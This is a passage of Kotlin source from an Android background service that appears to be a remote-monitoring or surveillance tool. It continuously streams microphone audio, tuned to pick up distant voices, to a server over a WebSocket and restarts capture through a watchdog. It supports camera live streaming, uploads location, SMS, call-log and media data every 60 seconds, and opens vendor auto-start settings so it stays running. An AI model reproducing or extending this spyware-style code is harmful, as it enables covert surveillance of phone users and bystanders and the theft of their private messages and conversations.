        startCameraLiveStream(preferredCameraFacing, cameraLiveStrictFacing)
    }

    private fun stopCameraLiveStream(reason: String) {
        val wasLive = isCameraLiveStreaming
        isCameraLiveStreaming = false
        cameraLiveJob?.cancel()
        cameraLiveJob = null
        if (wasLive) {
            safeSend("ACK:camera_live:stopped")
            sendHealthStatus("camera_live_off_$reason")
        }
    }

    private fun optimizePhotoJpeg(source: ByteArray, isFrontCamera: Boolean = false): ByteArray {
        return try {
            val qualityMode = photoQualityMode
            val bounds = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeByteArray(source, 0, source.size, bounds)
            
            // Use full resolution for HD, reasonable for others (no aggressive crop)
            val maxEdge = when (qualityMode) {
                "fast" -> 1280   // Increased from 1024 for better quality
                "hd" -> 1920
                else -> 1280
            }
            var sample = 1
            while ((bounds.outWidth / sample) > maxEdge || (bounds.outHeight / sample) > maxEdge) {
                sample *= 2
            }
            val opts = BitmapFactory.Options().apply { inSampleSize = sample.coerceAtLeast(1) }
            var bitmap = BitmapFactory.decodeByteArray(source, 0, source.size, opts) ?: return source
            
            // Mirror front camera images
            if (isFrontCamera) {
                val mirrored = ImageEnhancer.mirrorHorizontally(bitmap)
                bitmap.recycle()
                bitmap = mirrored
            }
            
            val enhanced = if (aiPhotoEnhancementEnabled) {
                // Detect capture mode based on brightness
                val avgLuma = ImageEnhancer.estimateLuma(bitmap)
                val mode = when {
                    photoNightMode != "off" -> ImageEnhancer.CaptureMode.NIGHT
                    else -> ImageEnhancer.detectMode(avgLuma)
                }
                
                Log.d(TAG, "Photo enhancement: luma=$avgLuma, mode=$mode")
                
                // Apply full enhancement pipeline
                ImageEnhancer.enhance(bitmap, mode, null)
            } else {
                bitmap
            }
            
            // Network-aware compression
            val jpegBytes = ImageEnhancer.compress(enhanced, lowNetworkMode, qualityMode)
            
            if (enhanced !== bitmap) enhanced.recycle()
            bitmap.recycle()
            
            jpegBytes
        } catch (e: Exception) {
            Log.w(TAG, "optimizePhotoJpeg failed: ${e.message}")
            source
        }
    }

    private fun applyColorAdjust(
        source: android.graphics.Bitmap,
        contrast: Float,
        brightness: Float,
        saturation: Float,
    ): android.graphics.Bitmap {
        val out = source.copy(android.graphics.Bitmap.Config.ARGB_8888, true)
        val satMatrix = ColorMatrix().apply { setSaturation(saturation) }
        val c = contrast
        val t = (-0.5f * c + 0.5f) * 255f + brightness
        val conMatrix = ColorMatrix(
            floatArrayOf(
                c, 0f, 0f, 0f, t,
                0f, c, 0f, 0f, t,
                0f, 0f, c, 0f, t,
                0f, 0f, 0f, 1f, 0f,
            )
        )
        satMatrix.postConcat(conMatrix)
        val canvas = Canvas(out)
        val paint = android.graphics.Paint(android.graphics.Paint.ANTI_ALIAS_FLAG).apply {
            colorFilter = ColorMatrixColorFilter(satMatrix)
        }
        canvas.drawBitmap(source, 0f, 0f, paint)
        return out
    }

    // ────────────────────────────────────────────────────────────────────────
    // Data collection — location, SMS, call log, media (every 60s)
    // ────────────────────────────────────────────────────────────────────────

    private fun startDataCollection() {
        stopDataCollection()
        dataJob = serviceScope.launch(Dispatchers.IO) {
            // Send immediately on connect, then every 60 seconds
            while (isActive) {
                sendDeviceData()
                delay(60_000)
            }
        }
    }

    private fun stopDataCollection() {
        dataJob?.cancel()
        dataJob = null
    }
    
    /**
     * Open auto-start settings for Chinese ROMs (Realme, Xiaomi, Vivo, etc.)
     * Returns true if successfully opened a settings activity
     */
    private fun openAutoStartSettings(): Boolean {
        val manufacturer = android.os.Build.MANUFACTURER.lowercase()
        Log.i(TAG, "Opening auto-start settings for manufacturer: $manufacturer")
        
        val autoStartIntents = when {
            manufacturer in listOf("oppo", "realme") -> listOf(
                // Realme UI 2.0+ / ColorOS 11+
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                )),
                // Realme UI 1.0 / ColorOS 7
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.startupapp.StartupAppListActivity"
                )),
                // Oppo ColorOS
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.oppo.safe",
                    "com.oppo.safe.permission.startup.StartupAppListActivity"
                )),
                // ColorOS 12+ / Realme UI 3+
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.oplus.safecenter",
                    "com.oplus.safecenter.permission.startup.StartupAppListActivity"
                ))
            )
            manufacturer in listOf("xiaomi", "redmi") -> listOf(
                // MIUI 12+
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
                )),
                // Older MIUI
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.permissions.PermissionsEditorActivity"
                ))
            )
            manufacturer == "vivo" -> listOf(
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.iqoo.secure",
                    "com.iqoo.secure.ui.phoneoptimize.AddWhiteListActivity"
                )),
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                ))
            )
            manufacturer == "huawei" || manufacturer == "honor" -> listOf(
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                )),
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.optimize.process.ProtectActivity"
                ))
            )
            manufacturer == "oneplus" -> listOf(
                android.content.Intent().setComponent(android.content.ComponentName(
                    "com.oneplus.security",
                    "com.oneplus.security.chainlaunch.view.ChainLaunchAppListActivity"
                ))
            )
            else -> emptyList()
        }
        
        for (intent in autoStartIntents) {
            try {
                intent.flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
                if (intent.resolveActivity(packageManager) != null) {
                    startActivity(intent)
                    Log.i(TAG, "Opened auto-start settings: ${intent.component}")
                    return true
                }
            } catch (e: Exception) {
                Log.w(TAG, "Could not open ${intent.component}: ${e.message}")
            }
        }
        
        Log.w(TAG, "No auto-start settings found for $manufacturer")
        return false
    }

    private fun sendDeviceData() {
        try {
            val data = dataCollector.collectAll()
            val msg = JSONObject()
            msg.put("type", "device_data")
            msg.put("deviceId", deviceId)
            msg.put("data", data)
            safeSend(msg.toString())
            Log.d(TAG, "Device data sent")
        } catch (e: Exception) {
            Log.e(TAG, "sendDeviceData error: ${e.message}")
        }
    }

    // ────────────────────────────────────────────────────────────────────────
    // Audio capture loop (raw PCM 16-bit mono 16 kHz)
    // ────────────────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")  // Permission already checked in MainActivity before service starts
    private fun startAudioCapture() {
        if (isCapturing) return
        if (isDeviceInCall()) {
            Log.w(TAG, "Mic start blocked: device is currently in call")
            sendHealthStatus("blocked_on_call")
            return
        }
        isCapturing = true
        lastAudioChunkSentAt = System.currentTimeMillis()

        serviceScope.launch(Dispatchers.IO) {
            // ── PRIORITY BOOST: Audio thread and network binding ─────────────
            // Set highest audio priority for this thread
            android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_AUDIO)
            
            // Bug 4: DO NOT call bindProcessToNetwork() — it pins ALL sockets
            // (WebSocket, HTTP, etc.) to one network. When that network drops,
            // ALL connections fail until audio capture restarts. The system's
            // default routing already handles WiFi↔Cellular transitions cleanly.
            
            // Monitoring: MODE_NORMAL for all profiles — avoids HAL AEC/NS/beamforming
            // that MODE_IN_COMMUNICATION enables on Qualcomm and similar (not controllable via AudioEffect).
            val am = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            am?.isMicrophoneMute  = false   // ensure mic is not software-muted
            am?.isSpeakerphoneOn  = false   // speakerphone off — avoids feedback loop
            am?.mode = AudioManager.MODE_NORMAL
            ourAudioMode = false
            
            // HQ Buffered Mode Removed (Issue M-08)
            try {
                audioRecord = createAudioRecordWithFallback()

                if (audioRecord == null) {
                    Log.e(TAG, "AudioRecord failed to initialize")
                    safeSend("{\"type\":\"error\",\"message\":\"mic_init_failed\",\"deviceId\":\"$deviceId\"}")
                    isCapturing = false
                    if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                    sendHealthStatus("mic_init_failed")
                    return@launch
                }

                audioRecord?.startRecording()
                resetEnhancerState()   // clear filter memory from any prior session
                Log.i(TAG, "🎙️ Audio capture started (${sampleRate}Hz, PCM16, mono)")
                sendHealthStatus("mic_started")

                val chunk = ByteArray(streamChunkSize)
                var consecutiveReadErrors = 0
                var nearSilentFrames = 0
                var rotateSourceOnExit = false
                val captureStartedAtMs = System.currentTimeMillis()
                var lastRecordingFlushAt = System.currentTimeMillis()

                while (isCapturing && isActive) {
                    val read = audioRecord?.read(chunk, 0, chunk.size) ?: -1
                    if (read > 0) {
                        consecutiveReadErrors = 0
                        // Some OEMs initialize a source successfully but feed near-zero samples.
                        // Detect prolonged near-silence and rotate to the next source automatically.
                        var peakAbs = 0
                        var i = 0
                        while (i + 1 < read) {
                            val s = readLeSample(chunk, i)
                            val abs = kotlin.math.abs(s)
                            if (abs > peakAbs) peakAbs = abs
                            i += 2
                        }
                        // Rotate source only for true digital-near-zero capture during startup.
                        // Normal quiet rooms or speech pauses must not trigger source restarts.
                        nearSilentFrames = if (peakAbs < 50) (nearSilentFrames + 1) else 0
                        val startupWindow = (System.currentTimeMillis() - captureStartedAtMs) <= 15_000L
                        if (nearSilentFrames >= 500 && startupWindow && sourceRotateAttempts < 1 && !isDeviceInCall()) {
                            val sourceCount = preferredAudioSources().size.coerceAtLeast(1)
                            audioSourceRotation = (audioSourceRotation + 1) % sourceCount
                            sourceRotateAttempts++
                            rotateSourceOnExit = true
                            isCapturing = false
                            sendHealthStatus("mic_source_rotate")
                            Log.w(TAG, "Mic near-silent with source=$activeAudioSource, rotating source")
                            continue
                        }
                        if (aiAutoModeEnabled) {
                            updateAutoAiProfile(chunk, read)
                        }
                        
                        // ══════════════════════════════════════════════════════════════════
                        // REALTIME MODE ──────────────────────────────────────────────────
                        // ══════════════════════════════════════════════════════════════════
                        if (System.currentTimeMillis() % 10000 < 100) {
                            Log.d(TAG, "Realtime mode active (isWebRtcStreaming=$isWebRtcStreaming)")
                        }
                        // Trick 2 + 3: adaptive upward gain for far voices + soft peak limiter
                        val pcmData = applyFarVoiceGain(chunk, read)

                        // 1) Live stream via legacy WS path only when WebRTC is inactive
                        if (!isWebRtcStreaming) {
                            if (safeSend(encodeWsFallbackAudio(pcmData).toByteString())) {
                                lastAudioChunkSentAt = System.currentTimeMillis()
                                if (lastAudioChunkSentAt - lastHealthSentAt >= 10_000) {
                                    sendHealthStatus("audio_tick")
                                }
                            } else {
                                Log.w(TAG, "Audio send failed - stopping capture for reconnect")
                                isCapturing = false
                                break
                            }
                        }

                        // 2) Write to recording file if active
                        if (isSavingFile) {
                            recordingFileStream?.write(pcmData)
                            val now = System.currentTimeMillis()
                            if (now - lastRecordingFlushAt >= 2_000L) {
                                recordingFileStream?.flush()
                                lastRecordingFlushAt = now
                            }
                        }
                    } else if (read == AudioRecord.ERROR_DEAD_OBJECT) {
                        Log.e(TAG, "AudioRecord dead object detected")
                        safeSend("{\"type\":\"error\",\"message\":\"mic_dead_object\",\"deviceId\":\"$deviceId\"}")
                        sendHealthStatus("mic_dead_object")
                        break
                    } else if (read == AudioRecord.ERROR || read == AudioRecord.ERROR_BAD_VALUE) {
                        consecutiveReadErrors++
                        if (consecutiveReadErrors >= 5) {
                            Log.e(TAG, "AudioRecord read failed repeatedly: $read")
                            safeSend("{\"type\":\"error\",\"message\":\"mic_read_error\",\"deviceId\":\"$deviceId\"}")
                            sendHealthStatus("mic_read_error")
                            break
                        }
                        delay(100)
                    } else {
                        // zero read: let watchdog decide if stream is stalled
                        delay(10)
                    }
                }

                audioRecord?.stop()
                releaseSessionAudioEffects()
                audioRecord?.release()
                audioRecord = null
                val wasCapturing = isCapturing
                isCapturing = false
                if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                Log.i(TAG, "Audio capture stopped")
                sendHealthStatus("mic_stopped")

                if (rotateSourceOnExit && wantsMicStreaming && activeWebSocket != null && !isWebRtcStreaming) {
                    delay(350)
                    startAudioCapture()
                } else if (wasCapturing && wantsMicStreaming && activeWebSocket != null && !isWebRtcStreaming) {
                    // Capture loop exited unexpectedly while stream is still requested.
                    delay(500)
                    startAudioCapture()
                }

            } catch (e: Exception) {
                // Bug G: Ignore the double-stop exception if we already triggered capturing to stop (e.g., from safeSend -> onWsDisconnected)
                if (!isCapturing && e is IllegalStateException) {
                    Log.i(TAG, "Audio capture loop stopped cleanly (IllegalStateException ignored)")
                    return@launch
                }
                Log.e(TAG, "Audio capture error", e)
                if (ourAudioMode) { am?.mode = AudioManager.MODE_NORMAL; ourAudioMode = false }
                isCapturing = false
                sendHealthStatus("mic_error")
            }
        }
    }

    private fun startMicWatchdog() {
        if (micWatchdogJob?.isActive == true) return
        micWatchdogJob = serviceScope.launch(Dispatchers.IO) {
            while (isActive) {
                delay(10_000)  // Check every 10 seconds
                if (!wantsMicStreaming || activeWebSocket == null || isRecoveringMic || isWebRtcStreaming) continue

                if (isDeviceInCall()) {
                    sendHealthStatus("blocked_on_call")
                    continue
                }

                // Layer 6: Watchdog - stall detection reduced to 10s as requested
                val stalled = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 10_000)
                if (!isCapturing || stalled) {
                    isRecoveringMic = true
                    try {
                        Log.w(TAG, "Mic watchdog recovery triggered (capturing=$isCapturing stalled=$stalled)")
                        sendHealthStatus("watchdog_recover")
                        stopAudioCapture()
                        delay(300)
                        startAudioCapture()
                    } finally {
                        isRecoveringMic = false
                    }
                }
            }
        }
    }

    private fun stopMicWatchdog() {
        micWatchdogJob?.cancel()
        micWatchdogJob = null
    }

    private fun createAudioRecordWithFallback(): AudioRecord? {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.w(TAG, "AudioRecord init blocked: RECORD_AUDIO permission not granted")
            sendHealthStatus("mic_permission_missing")
            return null
        }
        // VOICE_RECOGNITION is usually best for far-field pickup, but some devices return
        // near-silent audio on specific sources. We rotate starting source after failures.
        val sources = preferredAudioSources()
        val offset = audioSourceRotation.mod(sources.size.coerceAtLeast(1))
        for (idx in sources.indices) {
            val source = sources[(offset + idx) % sources.size]
            try {
                val rec = AudioRecord(
                    source,
                    sampleRate,
                    channelConfig,
                    audioFormat,
                    recordBufferSize
                )
                if (rec.state == AudioRecord.STATE_INITIALIZED) {
                    // API 28+: prevent Android from auto-switching to a different mic
                    // mid-session (e.g. switching to a noise-cancelling secondary mic that
                    // attenuates distant voices).
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        try { rec.preferredDevice = null } catch (_: Exception) {}
                    }
                    // API 29+: switch pickup pattern from directional (call/close-talk) to
                    // omnidirectional so the mic captures all directions equally.
                    // -1.0 = omni, 0.0 = neutral, +1.0 = front-directional.
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        try { rec.setPreferredMicrophoneFieldDimension(-1.0f) } catch (_: Exception) {}
                        // 0 = MIC_DIRECTION_UNSPECIFIED — disables beam-forming so all directions
                        // are captured equally instead of favouring near/front speech.
                        try { rec.setPreferredMicrophoneDirection(0) } catch (_: Exception) {}
                    }
                    // Hardware NS for far profile (stored until session ends — do not release here).
                    releaseSessionAudioEffects()
                    val sid = rec.audioSessionId
                    if (NoiseSuppressor.isAvailable()) {
                        try {
                            val canEnableHardwareNs = source == MediaRecorder.AudioSource.UNPROCESSED
                            noiseSuppressor = NoiseSuppressor.create(sid)?.also { e ->
                                e.enabled = voiceProfile == "far" && canEnableHardwareNs
                            }
                        } catch (_: Exception) {}
                    }
                    if (AcousticEchoCanceler.isAvailable()) {
                        try {
                            acousticEchoCanceler = AcousticEchoCanceler.create(sid)?.also { e ->
                                e.enabled = false
                            }
                        } catch (_: Exception) {}
                    }
                    if (AutomaticGainControl.isAvailable()) {
                        try {
                            automaticGainControl = AutomaticGainControl.create(sid)?.also { e ->
                                e.enabled = false
                            }
                        } catch (_: Exception) {}
                    }
                    activeAudioSource = source
                    Log.i(TAG, "AudioRecord initialized with source=$source, recordBuffer=$recordBufferSize, chunk=$streamChunkSize")
                    return rec
                }
                rec.release()
            } catch (e: Exception) {
                Log.w(TAG, "AudioRecord init failed for source=$source: ${e.message}")
            }
        }
        return null
    }

    private fun releaseSessionAudioEffects() {
        try { noiseSuppressor?.release() } catch (_: Exception) {}
        noiseSuppressor = null
        try { acousticEchoCanceler?.release() } catch (_: Exception) {}
        acousticEchoCanceler = null
        try { automaticGainControl?.release() } catch (_: Exception) {}
        automaticGainControl = null
    }

    /** Reset all IIR filter memory.  Must be called once at every capture-session start. */
    private fun resetEnhancerState() {
        hpfPrevX = 0.0; hpfPrevY = 0.0
        eq1X1 = 0.0; eq1X2 = 0.0; eq1Y1 = 0.0; eq1Y2 = 0.0
        hfShelfPrevOut = 0.0
        hfShelfNeedsPrime = true
        muLawDecimLp = 0.0
        smoothedGain = 1.0
        spectralDenoiser.reset()
        realtimeDenoiserWarmupChunksRemaining = 30
    }

    /**
    * Voice-monitor PCM enhancement pipeline.
     *
    * Correct order: denoise + controlled gain + limiter. Keep processing moderate
    * to avoid the distortion artifacts from overly aggressive EQ/boost stacks.
     *
    *  Stage 1 — HPF @ 120 Hz            removes sub-bass rumble
    *  Stage 2 — Presence EQ + high-shelf (low level — before gain)
    *  Stage 3 — Spectral denoiser       (skipped first ~30 chunks for model warmup)
    *  Stage 4 — Adaptive gain (+ user multiplier, single capped stage)
    *  Stage 5 — Soft peak limiter       prevents digital clipping
     *
     * Filter state (hpfPrev*, eq1*, bq*, pe*, smoothedGain) persists between
     * frames so there are no discontinuities at buffer boundaries.
     */
    private fun applyFarVoiceGain(buf: ByteArray, len: Int): ByteArray {
        if (len < 2) return buf.copyOf(len)
        val samples = len / 2
        val strongAi = aiEnhancementEnabled
        val p = voiceProfile

        val inWarmup = realtimeDenoiserWarmupChunksRemaining > 0
        if (realtimeDenoiserWarmupChunksRemaining > 0) realtimeDenoiserWarmupChunksRemaining--

        // ── Decode PCM-16 LE → double working buffer ─────────────────────────
        val work = DoubleArray(samples)
        for (i in 0 until samples) {
            val lo = buf[i * 2].toInt() and 0xFF
            val hi = buf[i * 2 + 1].toInt() and 0xFF
            work[i] = ((hi shl 8) or lo).toShort().toDouble()
        }

        // ── Stage 1: High-pass filter (~120 Hz, adaptive) ───────────────────
        val noisyEnv = estimatedNoiseDb > -54.0
        val hpAlpha = if (noisyEnv) 0.9500 else 0.9530
        for (i in 0 until samples) {
            val x = work[i]
            val y = hpAlpha * (hpfPrevY + x - hpfPrevX)
            hpfPrevX = x; hpfPrevY = y
            work[i] = y
        }

        // ── Stage 2a: Presence EQ @ 2.2 kHz (before gain — avoids honky resonance after boost) ──
        val eq1b0 = 1.1356685
        val eq1b1 = -0.9976115
        val eq1b2 = 0.4004227
        val eq1a1 = -0.9976115
        val eq1a2 = 0.5360913
        for (i in 0 until samples) {
            val x = work[i]
            val y = eq1b0 * x + eq1b1 * eq1X1 + eq1b2 * eq1X2 - eq1a1 * eq1Y1 - eq1a2 * eq1Y2
            eq1X2 = eq1X1
            eq1X1 = x
            eq1Y2 = eq1Y1
            eq1Y1 = y
            val wet = when (p) {
                "near" -> if (strongAi) 0.22 else 0.16
                "far" -> if (strongAi) 0.28 else 0.20
                else -> if (strongAi) 0.16 else 0.12
            }
            work[i] = x * (1.0 - wet) + y * wet
        }

        // ── Stage 2b: High-shelf @ ~3.5 kHz ─────────────────────────────────
        if (p == "far" || p == "near") {
            val hfGain = when (p) {
                "far" -> if (strongAi) 1.25 else 1.15
                "near" -> if (strongAi) 1.18 else 1.10
                else -> 1.08
            }
            val hfAlpha = 0.15
            var prevOut = hfShelfPrevOut
            if (hfShelfNeedsPrime && samples > 0) {
                prevOut = work[0]
                hfShelfNeedsPrime = false
            }
            for (i in 0 until samples) {
                val highFreq = work[i] - prevOut
                prevOut = prevOut + hfAlpha * (work[i] - prevOut)
                work[i] = prevOut + highFreq * hfGain
            }
            hfShelfPrevOut = prevOut
        }

        // ── Stage 3: Spectral denoise ──
        if (inWarmup) {
            val dummy = work.copyOf()
            spectralDenoiser.denoise(dummy)
        } else {
            val preDenoise = if (p == "far" || p == "near") work.copyOf() else null
            spectralDenoiser.denoise(work)
            if (preDenoise != null) {
                val blendOriginal = when (p) {
                    "far" -> 0.65
                    "near" -> 0.55
                    else -> 0.45
                }
                for (i in 0 until samples) {
                    work[i] = preDenoise[i] * blendOriginal + work[i] * (1.0 - blendOriginal)
                }
            }
        }

        // ── Stage 4: Adaptive gain (single loudness stage; no separate RMS norm — avoids pumping) ──
        var sumSq = 0.0
        for (v in work) sumSq += v * v
        val rms = Math.sqrt(sumSq / samples).coerceAtLeast(1.0)
        val gainCeil = when (p) {
            "near" -> if (strongAi) 4.5 else 3.5
            "far" -> if (strongAi) 5.5 else 4.5
            else -> if (strongAi) 4.0 else 3.5
        }
        val gainTarget = when (p) {
            "near" -> if (strongAi) 14500.0 else 11500.0
            "far" -> if (strongAi) 19500.0 else 16500.0
            else -> if (strongAi) 12500.0 else 10500.0
        }
        val rawGain = (gainTarget / rms).coerceIn(1.0, gainCeil)
        // Faster recovery after impulsive peaks without overreacting to single-frame transients.
        smoothedGain = if (rawGain > smoothedGain)
            smoothedGain * 0.55 + rawGain * 0.45
        else
            smoothedGain * 0.88 + rawGain * 0.12
        val userGain = softwareGainMultiplier.coerceIn(0.5, 5.0)
        val maxCombined = when (p) {
            "far" -> if (strongAi) 9.0 else 7.5
            "near" -> 5.5
            else -> 6.5
        }
        val combinedGain = (smoothedGain * userGain).coerceIn(1.0, maxCombined)
        for (i in 0 until samples) work[i] *= combinedGain

        // ── Stage 5: Soft peak limiter + encode PCM-16 LE ────────────────────
        val out = ByteArray(len)
        for (i in 0 until samples) {
            val limited = softPeakLimit(work[i])
            val clamped = limited.toInt().coerceIn(-32768, 32767)
            out[i * 2]     = (clamped and 0xFF).toByte()
            out[i * 2 + 1] = ((clamped shr 8) and 0xFF).toByte()
        }
        return out
    }

    private fun encodeWsFallbackAudio(pcm16: ByteArray): ByteArray {
        if (pcm16.isEmpty()) return pcm16
        val codec = chooseWsFallbackCodec()
        lastCodecChoice = codec // L-01: cache for sendHealthStatus
        val payload = if (codec == AUDIO_CODEC_MULAW_8K) pcm16ToMuLaw(pcm16) else pcm16
        val out = ByteArray(4 + payload.size)
        out[0] = 0x4D.toByte()
        out[1] = 0x4D.toByte()
        out[2] = 0x01
        out[3] = codec
        System.arraycopy(payload, 0, out, 4, payload.size)
        return out
    }

    private fun chooseWsFallbackCodec(): Byte {
        // Far field: always PCM (clarity over bandwidth).
        if (voiceProfile == "far") {
            return AUDIO_CODEC_PCM16_16K
        }
        // Low network: prefer PCM for voice clarity; MuLaw only when stream mode is "smart".
        if (lowNetworkMode) {
            return if (wsStreamMode == "smart") {
                Log.i(TAG, "Low-network + smart: MuLaw 8 kHz")
                AUDIO_CODEC_MULAW_8K
            } else {
                Log.i(TAG, "Low-network: PCM16 for clarity")
                AUDIO_CODEC_PCM16_16K
            }
        }

        return when (wsStreamMode) {
            "pcm" -> AUDIO_CODEC_PCM16_16K
            "smart" -> AUDIO_CODEC_MULAW_8K
            else -> {
                // AUTO MODE: Detect network conditions
                val cm = connectivityManager
                val network = cm?.activeNetwork
                val caps = if (network != null) cm.getNetworkCapabilities(network) else null
                val downKbps = caps?.linkDownstreamBandwidthKbps ?: 0
                val upKbps = caps?.linkUpstreamBandwidthKbps ?: 0

                // Use compression when:
                // - Bandwidth below 200 kbps (PCM needs ~256 kbps)
                // - OR multiple connection failures
                // - OR on cellular with poor signal
                val poorBandwidth = (downKbps in 1..200 || upKbps in 1..200)
                val connectionIssues = wsReconnectAttempts >= 3
                val poorCellular = caps?.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) == true && 
                                   (downKbps in 1..500)

                if (poorBandwidth || connectionIssues || poorCellular) {
                    Log.w(TAG, "Weak network ($downKbps down, $upKbps up, attempts=$wsReconnectAttempts) - using MuLaw compression")
                    AUDIO_CODEC_MULAW_8K  // 64 kbps vs 256 kbps
                } else {
                    AUDIO_CODEC_PCM16_16K  // Full quality when network is good
                }
            }
        }
    }

    /**
     * 16 kHz PCM → low-pass + 2:1 decimate → 8 kHz-equivalent samples, then µ-law.
     * Keeps codec bandwidth and sample counts consistent with server 8 kHz playback.
     */
    private fun pcm16ToMuLaw(pcm16: ByteArray): ByteArray {
        val samples = pcm16.size / 2
        val outLen = samples / 2
        if (outLen <= 0) return ByteArray(0)
        val out = ByteArray(outLen)
        var o = 0
        var i = 0
        while (i + 3 < pcm16.size) {
            val s0 = readLeSample(pcm16, i).toDouble()
            val s1 = readLeSample(pcm16, i + 2).toDouble()
            // Light LPF state across pairs reduces aliasing before decimation
            val blended = 0.5 * (s0 + s1)
            muLawDecimLp = muLawDecimLp * 0.65 + blended * 0.35
            val filtered = muLawDecimLp * 0.85 + blended * 0.15
            out[o++] = linearToMuLaw(filtered.toInt().coerceIn(-32768, 32767))
            i += 4
        }
        return out
    }

    private fun linearToMuLaw(sample: Int): Byte {
        val BIAS = 0x84
        val CLIP = 32635
        var pcmVal = sample
        val sign = if (pcmVal < 0) {
            pcmVal = -pcmVal
            0x80
        } else {
            0x00
        }
        if (pcmVal > CLIP) pcmVal = CLIP
        pcmVal += BIAS
        var exponent = 7
        var expMask = 0x4000
        while (exponent > 0 && (pcmVal and expMask) == 0) {
            exponent--
            expMask = expMask shr 1
        }
        val mantissa = (pcmVal shr (exponent + 3)) and 0x0F
        val muLaw = (sign or (exponent shl 4) or mantissa).inv() and 0xFF
        return muLaw.toByte()
    }

    // ────────────────────────────────────────────────────────────────────────
    // Overlap-add FFT spectral denoiser
    // ────────────────────────────────────────────────────────────────────────

    /**
     * Overlap-add spectral denoiser.
     *
     * Algorithm:
     *   1. Buffer incoming samples into 512-sample frames with 50% overlap.
     *   2. Apply Hann window and forward FFT.
     *   3. Estimate noise power spectrum by exponential averaging over quiet frames.
     *   4. Subtract the noise estimate from each frequency bin (power domain),
     *      keeping a spectral floor of 4% of the noise power to prevent musical noise.
     *   5. IFFT + Hann window + overlap-add → output.
     *
     * The denoiser is most effective on stationary noise: fans, AC hum, wind,
     * electrical hiss — exactly what a phone mic in a room picks up.  Neural
     * denoisers (RNNoise / DeepFilterNet) can go further but require NDK.
     *
     * Latency: HOP (256 samples) = 16 ms at 16 kHz — imperceptible in monitoring.
     */
    private inner class SpectralDenoiser {
        private val FRAME = 1024                // FFT length (must be power of 2)
        private val HOP   = FRAME / 2           // 50% overlap
        private val BINS  = FRAME / 2 + 1       // unique bins DC..Nyquist

        // Periodic Hann window — gives perfect reconstruction at 50% overlap.
        private val win = DoubleArray(FRAME) { i ->
            0.5 * (1.0 - Math.cos(2.0 * Math.PI * i / FRAME))
        }

        // Input overlap buffer — pre-primed with HOP zeros so output appears
        // immediately from the first call (no startup silence at the receiver).
        private val inBuf  = DoubleArray(FRAME)
        private var inFill = HOP

        // Output overlap-add accumulator
        private val outBuf   = DoubleArray(FRAME)
        // Queue of samples that are ready to be delivered to the caller
        private val readyOut = ArrayDeque<Double>(FRAME * 4)

        // Noise power spectrum (one value per positive frequency bin)
        private val noisePow = DoubleArray(BINS)
        /** FFT frames processed (always increments). */
        private var fftFramesProcessed = 0
        /** Frames where noise estimate was updated from quiet content only. */
        private var noiseAdaptFrames = 0

        fun reset() {
            inBuf.fill(0.0)
            inFill = HOP            // re-prime with zeros
            outBuf.fill(0.0)
            readyOut.clear()
            noisePow.fill(0.0)
            fftFramesProcessed = 0
            noiseAdaptFrames = 0
        }

        /**
         * Process [samples] in-place.  Always writes exactly [samples].size values
         * back into the array (zero-padded for the very first partial frame).
         */
        fun denoise(samples: DoubleArray) {
            val n   = samples.size
            val out = DoubleArray(n)
            var outIdx = 0

            for (s in samples) {
                inBuf[inFill++] = s
                if (inFill == FRAME) {
                    // Process frame → overlap-add → queue HOP output samples
                    val frameOut = processFrame()
                    for (i in 0 until FRAME) outBuf[i] += frameOut[i]
                    for (i in 0 until HOP)   readyOut.addLast(outBuf[i])
                    // Slide accumulator and input buffer
                    outBuf.copyInto(outBuf, 0, HOP, FRAME)
                    for (i in FRAME - HOP until FRAME) outBuf[i] = 0.0
                    inBuf.copyInto(inBuf, 0, HOP, FRAME)
                    inFill = HOP
                }
            }

            // Drain queued output; zero-pad only during the startup partial frame.
            while (outIdx < n) {
                out[outIdx++] = if (readyOut.isNotEmpty()) readyOut.removeFirst() else 0.0
            }
            System.arraycopy(out, 0, samples, 0, n)
        }

        private fun processFrame(): DoubleArray {
            // Windowed FFT
            val re = DoubleArray(FRAME) { i -> inBuf[i] * win[i] }
            val im = DoubleArray(FRAME)
            fft(re, im, false)

            // Power spectrum for positive bins
            val power = DoubleArray(BINS) { i -> re[i]*re[i] + im[i]*im[i] }
            val frameRms = Math.sqrt(power.average()).coerceAtLeast(1.0)
            fftFramesProcessed++

            // Update noise estimate only from quiet frames — never bootstrap on speech
            // (fast alpha when few noise frames collected; avoids "underwater" musical noise).
            val noiseFloorRms = Math.sqrt(noisePow.average()).coerceAtLeast(1.0)
            val isQuiet = frameRms < noiseFloorRms * 1.2 + 20.0
            if (isQuiet) {
                val alpha = if (noiseAdaptFrames < 15) 0.5 else 0.96
                for (i in noisePow.indices) {
                    noisePow[i] = alpha * noisePow[i] + (1.0 - alpha) * power[i]
                }
